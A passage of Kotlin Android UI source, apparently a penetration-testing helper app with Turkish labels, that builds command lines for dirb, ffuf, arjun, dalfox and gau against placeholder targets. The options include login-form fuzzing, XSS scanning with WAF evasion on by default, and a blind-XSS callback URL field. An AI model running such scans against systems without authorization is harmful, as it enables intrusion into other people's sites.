                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = userAgent,
                onValueChange = { userAgent = it },
                label = { Text("User-Agent (-a)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = cookie,
                onValueChange = { cookie = it },
                label = { Text("Cookie (-c)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-o dirb_results.txt Dosyaya Kaydet", checked = saveOutput, onCheckedChange = { saveOutput = it })

        // Live Command Synthesis
        val parts = mutableListOf("dirb", url.trim(), wordlist.trim())
        if (enableExtensions && customExtensions.isNotBlank()) parts.addAll(listOf("-X", customExtensions.trim()))
        if (nonRecursive) parts.add("-r")
        if (caseInsensitive) parts.add("-i")
        if (ignoreWarning) parts.add("-w")
        if (delayMs.isNotBlank() && delayMs.trim() != "0") parts.addAll(listOf("-z", delayMs.trim()))
        if (ignoreCode.isNotBlank()) parts.addAll(listOf("-N", ignoreCode.trim()))
        if (authUserPass.isNotBlank()) parts.addAll(listOf("-u", authUserPass.trim()))
        if (proxy.isNotBlank()) parts.addAll(listOf("-p", proxy.trim()))
        if (userAgent.isNotBlank()) parts.addAll(listOf("-a", "\"${userAgent.trim()}\""))
        if (cookie.isNotBlank()) parts.addAll(listOf("-c", "\"${cookie.trim()}\""))
        if (saveOutput) parts.addAll(listOf("-o", "dirb_results.txt"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 16. FFUF
@Composable
fun FfufBuilder(language: AppLanguage) {
    var fuzzMode by remember { mutableStateOf("dir") }
    var url by remember { mutableStateOf("https://target.com/FUZZ") }
    var vhostDomain by remember { mutableStateOf("target.com") }
    var wordlist by remember { mutableStateOf("/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt") }
    var extensions by remember { mutableStateOf(".php,.txt,.html,.json,.bak") }
    var enableExtensions by remember { mutableStateOf(false) }
    var httpMethod by remember { mutableStateOf("GET") }
    var postData by remember { mutableStateOf("") }
    var filterCodes by remember { mutableStateOf("404") }
    var filterSize by remember { mutableStateOf("") }
    var filterWords by remember { mutableStateOf("") }
    var filterLines by remember { mutableStateOf("") }
    var matchCodes by remember { mutableStateOf("200,204,301,302,307,401,403") }
    var enableMatchCodes by remember { mutableStateOf(false) }
    var threads by remember { mutableStateOf("40") }
    var rateLimit by remember { mutableStateOf("200") }

    // Bayraklar
    var recursion by remember { mutableStateOf(false) }
    var autoCalibrate by remember { mutableStateOf(true) }
    var colorize by remember { mutableStateOf(true) }
    var followRedirects by remember { mutableStateOf(true) }
    var useBurpProxy by remember { mutableStateOf(false) }
    var customHeader by remember { mutableStateOf("") }
    var outputFormat by remember { mutableStateOf("json") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("dir" to "Dizin & Dosya", "vhost" to "Sanal Host (VHost)", "param" to "Parametre Fuzz", "post" to "POST Data Fuzz").forEach { (m, lbl) ->
                val sel = fuzzMode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { fuzzMode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(
            value = if (fuzzMode == "vhost") vhostDomain else url,
            onValueChange = { if (fuzzMode == "vhost") vhostDomain = it else url = it },
            label = { Text(if (fuzzMode == "vhost") "Domain (örn: target.com)" else "Hedef URL (-u .../FUZZ)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Wordlist (-w)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("GET", "POST", "PUT", "DELETE", "PATCH").forEach { m ->
                val sel = httpMethod == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { httpMethod = m }.padding(vertical = 5.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = m, fontSize = 10.5.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        if (httpMethod != "GET" || fuzzMode == "post") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = postData,
                onValueChange = { postData = it },
                label = { Text("POST Verisi (-d 'user=FUZZ&pass=test')") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FİLTRELER VE EŞLEŞMELER", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = filterCodes,
                onValueChange = { filterCodes = it },
                label = { Text("Filtrele (-fc)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = filterSize,
                onValueChange = { filterSize = it },
                label = { Text("Boyut Ele (-fs)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = filterWords,
                onValueChange = { filterWords = it },
                label = { Text("Kelime Ele (-fw)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-e Uzantı Ekle ($extensions)", checked = enableExtensions, onCheckedChange = { enableExtensions = it })
        ToggleOption(label = "-mc Yalnızca Başarılı Kodlar ($matchCodes)", checked = enableMatchCodes, onCheckedChange = { enableMatchCodes = it })
        ToggleOption(label = "-recursion Özyinelemeli Keşif (-recursion-depth 2)", checked = recursion, onCheckedChange = { recursion = it })
        ToggleOption(label = "-ac Otomatik Filtre Kalibrasyonu (Auto-calibrate)", checked = autoCalibrate, onCheckedChange = { autoCalibrate = it })
        ToggleOption(label = "-r HTTP Yönlendirmelerini Takip Et", checked = followRedirects, onCheckedChange = { followRedirects = it })
        ToggleOption(label = "-x http://127.0.0.1:8080 Burp Proxy Kullan", checked = useBurpProxy, onCheckedChange = { useBurpProxy = it })
        Spacer(modifier = Modifier.height(4.dp))
        OutlinedTextField(
            value = customHeader,
            onValueChange = { customHeader = it },
            label = { Text("Özel Header (-H 'Authorization: Bearer ..') - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        // Live Command Synthesis
        val parts = mutableListOf("ffuf")
        if (fuzzMode == "vhost") {
            parts.addAll(listOf("-u", "https://$vhostDomain", "-H", "\"Host: FUZZ.$vhostDomain\"", "-w", wordlist.trim()))
        } else {
            parts.addAll(listOf("-u", url.trim(), "-w", wordlist.trim()))
        }

        if (httpMethod != "GET") {
            parts.addAll(listOf("-X", httpMethod))
            if (postData.isNotBlank()) parts.addAll(listOf("-d", "\"${postData.trim()}\""))
        }

        if (enableExtensions) parts.addAll(listOf("-e", extensions.trim()))
        if (filterCodes.isNotBlank()) parts.addAll(listOf("-fc", filterCodes.trim()))
        if (filterSize.isNotBlank()) parts.addAll(listOf("-fs", filterSize.trim()))
        if (filterWords.isNotBlank()) parts.addAll(listOf("-fw", filterWords.trim()))
        if (filterLines.isNotBlank()) parts.addAll(listOf("-fl", filterLines.trim()))
        if (enableMatchCodes) parts.addAll(listOf("-mc", matchCodes.trim()))
        if (recursion) parts.addAll(listOf("-recursion", "-recursion-depth", "2"))
        if (autoCalibrate) parts.add("-ac")
        if (colorize) parts.add("-c")
        if (followRedirects) parts.add("-r")
        if (customHeader.isNotBlank()) parts.addAll(listOf("-H", "\"${customHeader.trim()}\""))
        if (useBurpProxy) parts.addAll(listOf("-x", "http://127.0.0.1:8080"))
        parts.addAll(listOf("-t", threads.trim(), "-rate", rateLimit.trim()))

        when (outputFormat) {
            "json" -> parts.addAll(listOf("-o", "ffuf_results.json", "-of", "json"))
            "csv" -> parts.addAll(listOf("-o", "ffuf_results.csv", "-of", "csv"))
            "html" -> parts.addAll(listOf("-o", "ffuf_results.html", "-of", "html"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 17. ARJUN
@Composable
fun ArjunBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com/endpoint") }
    var method by remember { mutableStateOf("GET") }
    var wordlist by remember { mutableStateOf("") }
    var includeParams by remember { mutableStateOf("") }
    var customHeaders by remember { mutableStateOf("") }
    var threads by remember { mutableStateOf("10") }
    var delay by remember { mutableStateOf("1") }
    var timeout by remember { mutableStateOf("10") }
    var stable by remember { mutableStateOf(true) }
    var passive by remember { mutableStateOf(false) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("json") }

    Column {
        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("Hedef URL (-u) veya Liste (-i urls.txt)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("GET", "POST", "JSON", "XML").forEach { m ->
                val selected = method == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (selected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { method = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = m, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = wordlist,
                onValueChange = { wordlist = it },
                label = { Text("Özel Parametre Listesi (-w) - Opsiyonel") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = includeParams,
                onValueChange = { includeParams = it },
                label = { Text("Dahil Parametreler (--include id=1)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = customHeaders,
            onValueChange = { customHeaders = it },
            label = { Text("Özel Header (--headers 'X: Y') - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ANALİZ VE ATLATMA BAYRAKLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "--stable Sunucu Kararlılığını Analiz Et (Hata Azaltıcı)", checked = stable, onCheckedChange = { stable = it })
        ToggleOption(label = "--passive Wayback/CommonCrawl Pasif Parametre Toplama", checked = passive, onCheckedChange = { passive = it })
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (-t)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = delay,
                onValueChange = { delay = it },
                label = { Text("Gecikme sn (-d)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = timeout,
                onValueChange = { timeout = it },
                label = { Text("Timeout (-T)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("json" to "JSON (-oJ)", "text" to "Metin (-oT)", "burp" to "Burp Suite (-oB)").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("arjun")
        if (url.trim().endsWith(".txt")) {
            parts.addAll(listOf("-i", url.trim()))
        } else {
            parts.addAll(listOf("-u", url.trim()))
        }
        parts.addAll(listOf("-m", method, "-t", threads.trim(), "-d", delay.trim(), "-T", timeout.trim()))

        if (wordlist.isNotBlank()) parts.addAll(listOf("-w", wordlist.trim()))
        if (includeParams.isNotBlank()) parts.addAll(listOf("--include", "\"${includeParams.trim()}\""))
        if (customHeaders.isNotBlank()) parts.addAll(listOf("--headers", "\"${customHeaders.trim()}\""))
        if (stable) parts.add("--stable")
        if (passive) parts.add("--passive")
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("--proxy", proxyUrl.trim()))

        when (outputFormat) {
            "json" -> parts.addAll(listOf("-oJ", "arjun_params.json"))
            "text" -> parts.addAll(listOf("-oT", "arjun_params.txt"))
            "burp" -> parts.addAll(listOf("-oB", "127.0.0.1:8080"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 18. DALFOX
@Composable
fun DalfoxBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("url") }
    var target by remember { mutableStateOf("https://target.com/test.php?id=1") }
    var blindUrl by remember { mutableStateOf("") }
    var customPayloads by remember { mutableStateOf("") }
    var workers by remember { mutableStateOf("40") }
    var delayMs by remember { mutableStateOf("100") }
    var timeout by remember { mutableStateOf("10") }

    // XSS Taktikleri & Bayraklar
    var deepDom by remember { mutableStateOf(true) }
    var wafEvasion by remember { mutableStateOf(true) }
    var miningDom by remember { mutableStateOf(true) }
    var miningDict by remember { mutableStateOf(false) }
    var silence by remember { mutableStateOf(false) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("url" to "Tek URL (url)", "file" to "URL Listesi (file)", "pipe" to "Standart Girdi (pipe)").forEach { (m, lbl) ->
                val isSelected = mode == m
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { mode = m }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (mode == "file") "Dosya Yolu (targets.txt)" else "Hedef URL (https://target.com/page?id=1)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = blindUrl,
            onValueChange = { blindUrl = it },
            label = { Text("Blind XSS Callback URL (-b: örn: https://your.xss.ht) - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "XSS TESPİT VE ATLATMA BAYRAKLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "--deep-domxss Headless Chromium ile Derin DOM XSS Analizi", checked = deepDom, onCheckedChange = { deepDom = it })
        ToggleOption(label = "--waf-evasion WAF Filtre Atlama Payloadları", checked = wafEvasion, onCheckedChange = { wafEvasion = it })
        ToggleOption(label = "--mining-dom DOM Değişken ve Parametrelerini Çıkar", checked = miningDom, onCheckedChange = { miningDom = it })
        ToggleOption(label = "--mining-dict Sözlük ile Gizli Parametreleri Keşfet", checked = miningDict, onCheckedChange = { miningDict = it })
        ToggleOption(label = "--silence Banner ve Sade Çıktı Modu", checked = silence, onCheckedChange = { silence = it })
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = customPayloads,
            onValueChange = { customPayloads = it },
            label = { Text("Özel Payload Dosyası (--custom-payload) - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE ÇIKTI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = workers,
                onValueChange = { workers = it },
                label = { Text("Workers (-w)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = delayMs,
                onValueChange = { delayMs = it },
                label = { Text("Gecikme ms") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = timeout,
                onValueChange = { timeout = it },
                label = { Text("Timeout sn") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (-o)", "json" to "JSON (--format json)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("dalfox", mode)
        if (mode != "pipe") parts.add(target.trim())
        if (blindUrl.isNotBlank()) parts.addAll(listOf("-b", blindUrl.trim()))
        if (deepDom) parts.add("--deep-domxss")
        if (wafEvasion) parts.add("--waf-evasion")
        if (miningDom) parts.add("--mining-dom")
        if (miningDict) parts.add("--mining-dict")
        if (silence) parts.add("--silence")
        if (customPayloads.isNotBlank()) parts.addAll(listOf("--custom-payload", customPayloads.trim()))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("--proxy", proxyUrl.trim()))
        parts.addAll(listOf("-w", workers.trim(), "--delay", delayMs.trim(), "--timeout", timeout.trim()))

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "dalfox_findings.txt"))
            "json" -> parts.addAll(listOf("--format", "json", "-o", "dalfox_findings.json"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 19. GAU (GET ALL URLS)
@Composable
fun GauBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("target.com") }
    var includeSubs by remember { mutableStateOf(true) }
    var filterParams by remember { mutableStateOf(false) }
    var blacklistExt by remember { mutableStateOf("png,jpg,gif,svg,css,woff,woff2,ttf,ico") }
    var threads by remember { mutableStateOf("20") }
    var retries by remember { mutableStateOf("3") }
    var matchCodes by remember { mutableStateOf("") }
    var filterCodes by remember { mutableStateOf("404") }

    // Providers
    var provWayback by remember { mutableStateOf(true) }
    var provCommonCrawl by remember { mutableStateOf(true) }
    var provOtx by remember { mutableStateOf(true) }
    var provUrlScan by remember { mutableStateOf(true) }

    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = domain,
            onValueChange = { domain = it },
            label = { Text("Hedef Domain (target.com)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ARŞİV VE KAYNAK SAĞLAYICILARI (--providers)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Wayback", provWayback, modifier = Modifier.weight(1f)) { provWayback = !provWayback }
            ToggleChip("CommonCrawl", provCommonCrawl, modifier = Modifier.weight(1f)) { provCommonCrawl = !provCommonCrawl }
            ToggleChip("OTX", provOtx, modifier = Modifier.weight(1f)) { provOtx = !provOtx }
            ToggleChip("URLScan", provUrlScan, modifier = Modifier.weight(1f)) { provUrlScan = !provUrlScan }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FİLTRELER VE AYARLAR", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "--subs Tüm Alt Alan Adlarını (Subdomains) Dahil Et", checked = includeSubs, onCheckedChange = { includeSubs = it })
        ToggleOption(label = "--fp URL Parametrelerini Filtrele (Yalnızca Yolları Al)", checked = filterParams, onCheckedChange = { filterParams = it })
        Spacer(modifier = Modifier.height(4.dp))
        OutlinedTextField(
            value = blacklistExt,
            onValueChange = { blacklistExt = it },
            label = { Text("Kara Liste Uzantıları (--blacklist)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "AĞ VE PERFORMANS", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (--threads)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = retries,
                onValueChange = { retries = it },
                label = { Text("Retries (--retries)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = filterCodes,
                onValueChange = { filterCodes = it },
                label = { Text("Filtre Kod (--fc)") },
